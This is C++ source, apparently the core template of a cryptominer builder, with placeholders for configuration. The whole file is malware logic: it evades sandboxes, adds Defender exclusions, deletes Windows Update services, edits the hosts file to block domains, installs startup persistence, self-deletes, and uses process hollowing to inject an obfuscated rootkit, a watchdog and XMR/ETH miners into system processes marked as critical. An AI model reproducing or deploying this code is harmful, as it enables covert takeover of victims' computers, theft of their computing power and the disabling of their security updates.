#include "UFiles\ntddk.h"
#include <string>
#include <shlobj.h>

#include "UFiles\utils.h"
#include "UFiles\common.h"
#include "UFiles\obfuscate.h"
#include "UFiles\obfuscatew.h"
#include "UFiles\kernel32_undoc.h"
#include "UFiles\Injection\inject.h"
$RESOURCES

BOOLEAN bl;

void set_critical_process(HANDLE pHandle) {
#if DefProcessProtect
    if (pHandle > 0 && (bl || NT_SUCCESS(UpRtlAdjustPrivilege(20, TRUE, FALSE, &bl))))
    {
        ULONG breakStatus = true;
        UtSetInformationProcess(pHandle, (PROCESSINFOCLASS)0x1d, &breakStatus, sizeof(ULONG));
    }
#endif
}

void inject_process(LPCWSTR mutex, BYTE* payload, size_t payloadSize, wchar_t* cmdLine, wchar_t* startDir, bool setCritical) {
    if (!check_mutex(mutex)) {
        HANDLE pHandle = transacted_hollowing(cmdLine, payload, payloadSize, NULL);
        if (setCritical) {
            set_critical_process(pHandle);
        }
        UtClose(pHandle);
    }
}

char* cipher(unsigned char* data, ULONG dataLen) {
    char* key = AY_OBFUSCATE("#CIPHERKEY");
    char* output = (char*)malloc(sizeof(char) * dataLen+1);
	output[dataLen] = 0;
	for (int i = 0; i < dataLen; ++i) {
		output[i] = data[i] ^ key[i % 32];
	}
    return output;
}

int wmain(int argc, wchar_t* argv[])
{
#if DefStartDelay
    LARGE_INTEGER sleeptime;
    sleeptime.QuadPart = -($STARTDELAY * 10000);
    ULONGLONG timeBeforeSleep = GetTickCount64();
    UtDelayExecution(FALSE, &sleeptime);
    if ((timeBeforeSleep - GetTickCount64()) < $STARTDELAY - 500) {
        return 0;
    }
#endif

    load_kernel32_functions();

#if DefWDExclusions
    run_program(true, AYW_OBFUSCATE(L"#WDCOMMAND"));
#endif
#if DefDisableWindowsUpdate
    run_program(false, AYW_OBFUSCATE(L"cmd /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc\" /f"));
#endif
#if DefDisableSleep
    run_program(false, AYW_OBFUSCATE(L"cmd /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"));
#endif


    wchar_t sysdir[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, CSIDL_SYSTEM, NULL, 0, sysdir);

#if DefBlockWebsites
    wchar_t hostsPath[MAX_PATH] = { 0 };
    combine_path(hostsPath, sysdir, AYW_OBFUSCATE(L"\\drivers\\etc\\hosts"));
    ULONG hostsFileSize;
    PVOID hostsFile = read_file(hostsPath, &hostsFileSize);
    if (hostsFile) {
        std::string hostsString((const char*)hostsFile);
        char* domainSet[] = { $CPPDOMAINSET };
        for (int i = 0; i < $DOMAINSETSIZE; i++) {
            if (hostsString.find(domainSet[i]) == std::string::npos) {
                hostsString += '\r';
                hostsString += '\n';
                hostsString.append(AY_OBFUSCATE("0.0.0.0      "));
                hostsString.append(domainSet[i]);
            }
        }
        write_file(hostsPath, (PVOID)hostsString.c_str(), hostsString.size());
    }
#endif

#if DefStartup
    wchar_t exePath[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    wchar_t startupPath[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, $BASEDIR, NULL, 0, startupPath);
    wcscat(startupPath, AYW_OBFUSCATE(L"#STARTUPFILE"));

    run_program(true, AYW_OBFUSCATE(L"#STARTUPADD"), startupPath, startupPath, startupPath);

    wchar_t conhostPath[MAX_PATH] = { 0 };
    combine_path(conhostPath, sysdir, AYW_OBFUSCATE(L"#CONHOSTPATH"));

    if (wcsicmp(exePath, startupPath) != 0) {
        ULONG fileSize;
        PVOID exeFile = read_file(exePath, &fileSize);
        fileSize++;
        write_file(startupPath, exeFile, fileSize);
#if DefRootkit
        inject_process(NULL, (BYTE*)cipher(resRootkit, resRootkitSize), resRootkitSize, conhostPath, sysdir, false);
#endif
#if DefRunInstall
        run_program(false, AYW_OBFUSCATE(L"#STARTUPSTART"), startupPath);
#endif
#if DefAutoDelete
        run_program(false, AYW_OBFUSCATE(L"cmd /c choice /C Y /N /D Y /T 3 & Del \"%S\""), exePath);
#endif
        return 0;
    }

#if DefWatchdog
    wchar_t watchdogPath[MAX_PATH] = { 0 };
    combine_path(watchdogPath, conhostPath, AYW_OBFUSCATE(L" #WATCHDOGID"));
    inject_process(AYW_OBFUSCATE(L"Global\\#WATCHDOGID"), (BYTE*)cipher(resWatchdog, resWatchdogSize), resWatchdogSize, watchdogPath, sysdir, true);
#endif
#endif

    wchar_t libPath[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, $CPPLIBSROOT, NULL, 0, libPath);
    wcscat(libPath, AYW_OBFUSCATE(L"\\Google\\Libs\\"));

#if DefXMR
    wchar_t libWR64Path[MAX_PATH] = { 0 };
    combine_path(libWR64Path, libPath, AYW_OBFUSCATE(L"WR64.sys"));
    write_file(libWR64Path, cipher(resWR64, resWR64Size), resWR64Size);
#endif

    bool hasGPU = has_gpu(libPath);

#if DefXMRGPU
    if (hasGPU) {
        wchar_t ddb64Path[MAX_PATH] = { 0 };
        combine_path(ddb64Path, libPath, AYW_OBFUSCATE(L"ddb64.dll"));
        write_file(ddb64Path, cipher(resddb64, resddb64Size), resddb64Size);
        wchar_t nvrtcPath[MAX_PATH] = { 0 };
        combine_path(nvrtcPath, libPath, AYW_OBFUSCATE(L"nvrtc64_112_0.dll"));
        write_file(nvrtcPath, cipher(resnvrtc, resnvrtcSize), resnvrtcSize);
        wchar_t nvrtc2Path[MAX_PATH] = { 0 };
        combine_path(nvrtc2Path, libPath, AYW_OBFUSCATE(L"nvrtc-builtins64_112.dll"));
        write_file(nvrtc2Path, cipher(resnvrtc2, resnvrtc2Size), resnvrtc2Size);
    }
#endif

    wchar_t* minerSet[][3] = { $MINERSET };

    for (int i = 0; i < $MINERCOUNT; i++) {
        bool typeETH = wcsicmp(AYW_OBFUSCATE(L"eth"), minerSet[i][0]) == 0;
        if (!(typeETH && !hasGPU)) {
            wchar_t injectPath[MAX_COMMAND_LENGTH] = { 0 };
            combine_path(injectPath, sysdir, minerSet[i][2]);
            inject_process(minerSet[i][1], (BYTE*)(typeETH ? cipher(resETH, resETHSize) : cipher(resXMR, resXMRSize)), (typeETH ? resETHSize : resXMRSize), injectPath, sysdir, true);
        }
    }
	return 0;
} 
